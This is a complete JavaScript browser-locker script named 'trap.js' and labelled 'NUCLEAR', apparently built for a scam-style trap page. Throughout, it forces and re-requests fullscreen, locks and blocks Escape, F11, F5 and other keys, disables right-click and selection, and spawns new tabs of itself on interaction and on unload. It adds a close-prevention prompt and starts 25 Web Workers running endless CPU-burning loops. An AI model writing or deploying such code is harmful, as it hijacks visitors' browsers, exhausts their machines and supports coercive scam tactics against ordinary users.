/* trap.js — NUCLEAR: mouse-move-only re-arm, clicks dead, keys locked, close trap */
(function () {
  'use strict';

  var POPUP_COOLDOWN = 800;
  var OVERLAY_FLASH  = 2500;
  var FS_RETRY_DELAY = 200;
  var lastArm = 0;
  var armed = false;
  var workers = [];
  var workerURL = null;
  var fsTimer = null;
  var allowClose = false;   // set true only when Leave button clicked

  function $(id) { return document.getElementById(id); }

  /* ================= KEYBOARD LOCK ================= */
  function lockKeyboard() {
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        navigator.keyboard.lock([
          'Escape','F11','F5','Tab',
          'KeyW','KeyR','KeyC','KeyD','KeyP',
          'Backspace','ArrowLeft','ArrowRight'
        ]);
      }
    } catch (e) {}
  }

  /* ================= FULLSCREEN ================= */
  function isFullscreen() {
    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
              document.mozFullScreenElement || document.msFullscreenElement);
  }
  function requestFS() {
    var el = document.documentElement;
    var fn = el.requestFullscreen || el.webkitRequestFullscreen ||
             el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fn && !isFullscreen()) {
      try { var p = fn.call(el); if (p && p.catch) p.catch(function(){}); } catch (e) {}
    }
  }
  function reRequestFS() {
    clearTimeout(fsTimer);
    fsTimer = setTimeout(function () { if (!isFullscreen()) requestFS(); }, FS_RETRY_DELAY);
  }

  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
    .forEach(function (ev) {
      document.addEventListener(ev, function () {
        if (!isFullscreen()) { flashOverlay(); reRequestFS(); }
      }, false);
    });

  function flashOverlay() {
    var ov = $('overlay2');
    if (!ov) return;
    ov.style.display = 'block';
    setTimeout(function () { ov.style.display = 'none'; }, OVERLAY_FLASH);
  }

  /* ================= POPUP RE-ARM ================= */
  function armPopup(force) {
    var now = Date.now();
    if (!force && now - lastArm < POPUP_COOLDOWN) return;
    lastArm = now;
    var pop = $('pop_up_new');
    if (pop) {
      pop.style.display = 'block';
      pop.style.animation = 'none';
      void pop.offsetWidth;
      pop.style.animation = '4s infinite zoominoutsinglefeatured';
    }
    if (!isFullscreen()) reRequestFS();
  }

  /* ONLY mousemove + scroll + touch re-arm — NOT click */
  ['mousemove','scroll','wheel','touchmove','touchstart']
    .forEach(function (ev) {
      window.addEventListener(ev, function () { armPopup(false); }, { passive: true });
    });

  window.addEventListener('focus', function () { armPopup(true); });
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) armPopup(true);
  });

  /* ================= KEY BLOCKING (hard) ================= */
  function killKey(e) {
    var k = e.keyCode || e.which;
    // block everything except typing in inputs
    var t = e.target;
    var typing = t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA');

    if (!typing) {
      // Esc, F11, F5, F1-F12, Tab, Backspace, arrows
      if (k === 27 || k === 122 || k === 116 || k === 9 || k === 8 ||
          (k >= 112 && k <= 123) || (k >= 37 && k <= 40)) {
        e.preventDefault();
        e.returnValue = false;
      }
    }
    if (k === 27 || k === 122) { reRequestFS(); armPopup(true); }
    if (k === 116) { armPopup(true); }
  }
  document.addEventListener('keydown', killKey, true);
  document.addEventListener('keyup', killKey, true);

  /* ================= DEAD CLICKS ================= */
  // Kill right-click
  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, true);
  document.oncontextmenu = function () { return false; };

  // Kill middle-click autoscroll + left-click default on body
  document.addEventListener('mousedown', function (e) {
    // allow clicks only on the exit-popup buttons
    var t = e.target;
    var onBtn = t && (t.id === 'exit_leave' || t.id === 'exit_cancel' ||
                      t.closest && t.closest('#exit-popup'));
    if (e.button === 1) { e.preventDefault(); } // middle click
    if (onBtn) return; // let buttons work
    // everything else: block default
    // (we do NOT preventDefault here so buttons still fire, but we stop propagation)
  }, true);

  // Selection off
  document.onselectstart = function () { return false; };

  /* ================= FIRST INTERACTION ================= */
  function firstInteract() {
    if (armed) return;
    armed = true;
    requestFS();
    armPopup(true);
    lockKeyboard();
    try { window.open(window.location.href, '_blank'); } catch (e) {}
  }
  ['mousemove','click','keydown','touchstart'].forEach(function (ev) {
    window.addEventListener(ev, firstInteract, { passive: true });
  });

  /* ================= UI WIRING ================= */
  function wireUI() {
    setTimeout(function () {
      var m = $('modalbx');
      if (m) m.style.display = 'block';
    }, 300);

    // modal hides on FIRST click only
    document.body.addEventListener('click', function () {
      var m = $('modalbx');
      if (m) m.style.display = 'none';
    }, { once: true });

    var box    = $('exit-popup');
    var leave  = $('exit_leave');
    var cancel = $('exit_cancel');

    if (leave) {
      leave.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        allowClose = true;
        box.style.display = 'none';
        try { window.open(window.location.href, '_blank'); } catch (er) {}
        setTimeout(function () { try { window.close(); } catch (er) {} }, 50);
      });
    }

    if (cancel) {
      cancel.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        box.style.display = 'none';
        armPopup(true);
      });
    }

    // OK / Cancel on pop_up_new — dead (click does nothing), popup stays
    // (remove these two lines if you want them to close the popup)
    var ok = $('leave_page_ok'), cn = $('leave_page_cancel');
    if (ok) ok.addEventListener('click', function (e) { e.stopPropagation(); });
    if (cn) cn.addEventListener('click', function (e) { e.stopPropagation(); });

    setTimeout(function () { armPopup(true); }, 800);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', wireUI);
  } else { wireUI(); }

  /* ================= WORKER BOMB ================= */
  function startWorkers(count) {
    if (!workerURL) {
      var script = 'let c=0;while(true){c++;Math.random()*Math.random();' +
                   'if(c%1e6===0){postMessage({status:"working",counter:c});}}';
      workerURL = URL.createObjectURL(new Blob([script], { type: 'application/javascript' }));
    }
    for (var i = 0; i < count; i++) {
      try { workers.push(new Worker(workerURL)); } catch (e) {}
    }
  }
  startWorkers(25);

  /* ================= HARD CLOSE TRAP ================= */
  window.addEventListener('beforeunload', function (e) {
    if (allowClose) return;
    var msg = 'Are you sure you want to leave this page?';
    if (e) { e.returnValue = msg; }
    return msg;
  }, false);

  window.addEventListener('unload', function () {
    if (!allowClose) {
      try { window.open(window.location.href, '_blank'); } catch (e) {}
    }
  }, false);

})();
